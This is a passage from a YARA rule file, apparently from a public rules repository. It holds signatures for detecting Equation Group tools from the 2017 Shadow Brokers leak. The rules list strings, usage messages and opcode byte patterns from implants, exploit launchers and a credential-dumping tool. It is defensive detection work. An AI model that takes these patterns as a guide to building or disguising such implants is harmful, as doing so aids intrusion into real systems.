\"EquationGroup_Toolset_Apr17_ntfltmgr\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s3 = \"wCw3wDwAw2wNw@wEwZw2wDwEwBwZwFwFw4w2wZw5w1w4wFwZwGwOwGwGwEw5w2wFwGwDwFwOw\" fullword ascii\n        $s6 = \"w+w;w2w0w6w4w.w(wRw\" fullword ascii\n        $op1 = { 80 f7 ff ff 49 89 84 34 18 02 00 00 41 83 a4 34 }\n        $op2 = { ff 15 0b 34 00 00 eb 92 }\n        $op3 = { 4d 8d b4 34 08 02 00 00 4d 85 f6 0f 84 ae }\n        $op4 = { 8b ca 2b ce 8d 34 01 0f b7 3e 66 3b 7d f0 89 75 }\n        $op5 = { 8a 40 01 00 c7 47 70 }\n        $op6 = { e9 3c ff ff ff 6a ff 8d 45 f0 50 e8 27 11 00 00 }\n        $op7 = { 8b 45 08 53 57 8b 7d 0c c7 40 34 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and 4 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_DiBa_Target_BH\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_DiBa_Target_BH\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $op0 = { 44 89 20 e9 40 ff ff ff 8b c2 48 8b 5c 24 60 48 }\n        $op1 = { 45 33 c9 49 8d 7f 2c 41 ba }\n        $op2 = { 89 44 24 34 eb 17 4c 8d 44 24 28 8b 54 24 30 48 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_PC_LP\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_PC_LP\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"* Failed to get connection information.  Aborting launcher!\" fullword wide\n        $s2 = \"Format: <command> <target port> [lp port]\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_RemoteCommand_Lp\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_RemoteCommand_Lp\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"Failure parsing command from %hs:%u: os=%u plugin=%u\" fullword wide\n        $s2 = \"Unable to get TCP listen port: %08x\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_lp_mstcp\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_lp_mstcp\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n        $s2 = \"_PacketNDISRequestComplete@12\\\"\" fullword ascii\n        $s3 = \"_LDNdis5RegDeleteKeys@4\" fullword ascii\n        $op1 = { 89 7e 04 75 06 66 21 46 02 eb }\n        $op2 = { fc 74 1b 8b 49 04 0f b7 d3 66 83 }\n        $op3 = { aa 0f b7 45 fc 8b 52 04 8d 4e }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and (all of ($s*) or all of ($op*)))\n}\n\nrule EquationGroup_Toolset_Apr17_renamer\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_renamer\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"FILE_NAME_CONVERSION.LOG\" fullword wide\n        $s2 = \"Log file exists. You must delete it!!!\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 80KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_PC_Exploit\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_PC_Exploit\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"\\\\\\\\.\\\\pipe\\\\pcheap_reuse\" fullword wide\n        $s2 = \"**** FAILED TO DUPLICATE SOCKET ****\" fullword wide\n        $s3 = \"**** UNABLE TO DUPLICATE SOCKET TYPE %u ****\" fullword wide\n        $s4 = \"YOU CAN IGNORE ANY 'ServiceEntry returned error' messages after this...\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 20KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_PC_Level3_Gen\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_PC_Level3_Gen\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"S-%u-%u\" fullword ascii\n        $s2 = \"Copyright (C) Microsoft\" fullword wide\n        $op1 = { 24 39 65 c6 44 24 3a 6c c6 44 24 3b 65 c6 44 24 }\n        $op2 = { 44 24 4e 41 88 5c 24 4f ff }\n        $op3 = { 44 24 3f 6e c6 44 24 40 45 c6 44 24 41 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and 3 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_put_Implant9x\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_put_Implant9x\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"3&3.3<3A3F3K3V3c3m3\" fullword ascii\n        $op1 = { c9 c2 08 00 b8 72 1c 00 68 e8 c9 fb ff ff 51 56 }\n        $op2 = { 40 1b c9 23 c8 03 c8 38 5d 14 74 05 6a 03 58 eb }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 20KB and 2 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_promiscdetect_safe\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_promiscdetect_safe\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"running on this computer!\" fullword ascii\n        $s2 = \"- Promiscuous (capture all packets on the network)\" fullword ascii\n        $s3 = \"Active filter for the adapter:\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 80KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_PacketScan_Implant\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_PacketScan_Implant\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $op0 = { e9 ef fe ff ff ff b5 c0 ef ff ff 8d 85 c8 ef ff }\n        $op1 = { c9 c2 04 00 b8 34 26 00 68 e8 40 05 00 00 51 56 }\n        $op2 = { e9 0b ff ff ff 8b 45 10 8d 4d c0 89 58 08 c6 45 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 30KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_SetPorts\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_SetPorts\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"USAGE: SetPorts <input file> <output file> <version> <port1> [port2] [port3] [port4] [port5]\" fullword ascii\n        $s2 = \"Valid versions are:  1 = PC 1.2   2 = PC 1.2 (24 hour)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_GrDo_FileScanner_Implant\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_GrDo_FileScanner_Implant\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"system32\\\\winsrv.dll\" fullword wide\n        $s2 = \"raw_open CreateFile error\" fullword ascii\n        $s3 = \"\\\\dllcache\\\\\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_msgks_mskgu\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_msgks_mskgu\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 }\n        $op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 }\n        $op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Ifconfig_Target\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Ifconfig_Target\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\Tcpip\\\\Parameters\\\\Interfaces\\\\%hs\" fullword wide\n        $op1 = { 0f be 37 85 f6 0f 85 4e ff ff ff 45 85 ed 74 21 }\n        $op2 = { 4c 8d 44 24 34 48 8d 57 08 41 8d 49 07 e8 a6 4b }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_DiBa_Target\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_DiBa_Target\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $op1 = { 41 5a 41 59 41 58 5f 5e 5d 5a 59 5b 58 48 83 c4 }\n        $op2 = { f9 48 03 fa 48 33 c0 8a 01 49 03 c1 49 f7 e0 88 }\n        $op3 = { 01 41 f6 e0 49 03 c1 88 01 48 33 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Dsz_Implant\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Dsz_Implant\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"%02u:%02u:%02u.%03u-%4u: \" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_GenKey\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_GenKey\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"* PrivateEncrypt -> PublicDecrypt FAILED\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 80KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_wmi_Implant\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_wmi_Implant\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"SELECT ProcessId,Description,ExecutablePath FROM Win32_Process\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 50KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_clocksvc\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_clocksvc\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"~debl00l.tmp\" fullword ascii\n        $x2 = \"\\\\\\\\.\\\\mailslot\\\\c54321\" fullword ascii\n        $x3 = \"\\\\\\\\.\\\\mailslot\\\\c12345\" fullword ascii\n        $x4 = \"nowMutex\" fullword ascii\n        $s1 = \"System\\\\CurrentControlSet\\\\Services\\\\MSExchangeIS\\\\ParametersPrivate\" fullword ascii\n        $s2 = \"000000005017C31B7C7BCF97EC86019F5026BE85FD1FB192F6F4237B78DB12E7DFFB07748BFF6432B3870681D54BEF44077487044681FB94D17ED04217145B98\" ascii\n        $s3 = \"00000000E2C9ADBD8F470C7320D28000353813757F58860E90207F8874D2EB49851D3D3115A210DA6475CCFC111DCC05E4910E50071975F61972DCE345E89D88\" ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and (1 of ($x*) or 2 of ($s*)))\n}\n\nrule EquationGroup_Toolset_Apr17_xxxRIDEAREA\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_xxxRIDEAREA\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"USAGE: %s -i InputFile -o OutputFile [-f FunctionOrdinal] [-a FunctionArgument] [-t ThreadOption]\" fullword ascii\n        $x2 = \"The output payload \\\"%s\\\" has a size of %d-bytes.\" fullword ascii\n        $x3 = \"ERROR: fwrite(%s) failed on ucPayload\" fullword ascii\n        $x4 = \"Load and execute implant within the existing thread\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_yak_min_install\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_yak_min_install\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"driver start\" fullword ascii\n        $s2 = \"DeviceIoControl Error: %d\" fullword ascii\n        $s3 = \"Phlook\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_SetOurAddr\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_SetOurAddr\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"USAGE: SetOurAddr <input file> <output file> <protocol> [IP/IPX address]\" fullword ascii\n        $s2 = \"Replaced default IP address (127.0.0.1) with Local IP Address %d.%d.%d.%d\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_GetAdmin_LSADUMP_ModifyPrivilege_Implant\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_GetAdmin_LSADUMP_ModifyPrivilege_Implant\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"\\\\system32\\\\win32k.sys\" fullword wide\n        $s2 = \"hKeAddSystemServiceTable\" fullword ascii\n        $s3 = \"hPsDereferencePrimaryToken\" fullword ascii\n        $s4 = \"CcnFormSyncExFBC\" fullword wide\n        $s5 = \"hPsDereferencePrimaryToken\" fullword ascii\n        $op1 = { 0c 2b ca 8a 04 11 3a 02 75 01 47 42 4e 75 f4 8b }\n        $op2 = { 14 83 c1 05 80 39 85 75 0c 80 79 01 c0 75 06 80 }\n        $op3 = { eb 3d 83 c0 06 33 f6 80 38 ff 75 2c 80 78 01 15 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 80KB and (4 of ($s*) or all of ($op*)))\n}\n\nrule EquationGroup_Toolset_Apr17_SendPKTrigger\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_SendPKTrigger\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"----====**** PORT KNOCK TRIGGER BEGIN ****====----\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_DmGz_Target_2\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_DmGz_Target_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"\\\\\\\\.\\\\%ls\" fullword ascii\n        $op0 = { e8 ce 34 00 00 b8 02 00 00 f0 e9 26 02 00 00 48 }\n        $op1 = { 8b 4d 28 e8 02 05 00 00 89 45 34 eb 07 c7 45 34 }\n        $op2 = { e8 c2 34 00 00 90 48 8d 8c 24 00 01 00 00 e8 a4 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_mstcp32_DXGHLP16_tdip\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_mstcp32_DXGHLP16_tdip\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"\\\\Registry\\\\User\\\\CurrentUser\\\\\" fullword wide\n        $s2 = \"\\\\DosDevices\\\\%ws\" fullword wide\n        $s3 = \"\\\\Device\\\\%ws_%ws\" fullword wide\n        $s4 = \"sys\\\\mstcp32.dbg\" fullword ascii\n        $s5 = \"%ws%03d%ws%wZ\" fullword wide\n        $s6 = \"TCP/IP driver\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 4 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_regprobe\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_regprobe\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Usage: %s targetIP protocolSequence portNo [redirectorIP] [CLSID]\" fullword ascii\n        $x2 = \"key does not exist or pinging w2k system\" fullword ascii\n        $x3 = \"RpcProxy=255.255.255.255:65536\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_DoubleFeatureDll_dll_2\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_DoubleFeatureDll_dll_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \".dllfD\" fullword ascii\n        $s2 = \"Khsppxu\" fullword ascii\n        $s3 = \"D$8.exe\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and 2 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_GangsterThief_Implant\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_GangsterThief_Implant\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"\\\\\\\\.\\\\%s:\" fullword wide\n        $s4 = \"raw_open CreateFile error\" fullword ascii\n        $s5 = \"-PATHDELETED-\" fullword ascii\n        $s6 = \"(deleted)\" fullword wide\n   